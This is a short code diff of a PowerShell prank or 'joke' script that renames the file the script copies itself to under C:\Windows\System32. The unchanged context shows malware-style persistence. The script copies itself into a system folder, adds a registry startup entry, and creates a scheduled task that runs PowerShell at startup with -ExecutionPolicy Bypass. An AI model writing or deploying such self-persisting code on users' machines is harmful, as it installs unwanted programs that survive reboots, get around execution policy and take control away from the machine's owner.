@@ -24,7 +24,7 @@ function Start-JokeLoop {
 
 # Persistence via Registry (runs script at startup)
 function Set-RegistryPersistence {
-    $scriptPath = "C:\Windows\System32\joke_script.ps1"
+    $scriptPath = "C:\Windows\System32\jokes.ps1"
     
     # Save the script to the specified path
     Copy-Item $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
@@ -39,7 +39,7 @@ function Set-RegistryPersistence {
 
 # Function to create Scheduled Task for persistence
 function Set-ScheduledTaskPersistence {
-    $scriptPath = "C:\Windows\System32\joke_script.ps1"
+    $scriptPath = "C:\Windows\System32\jokes.ps1"
     
     # Create the scheduled task to run on startup
     $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -File $scriptPath"
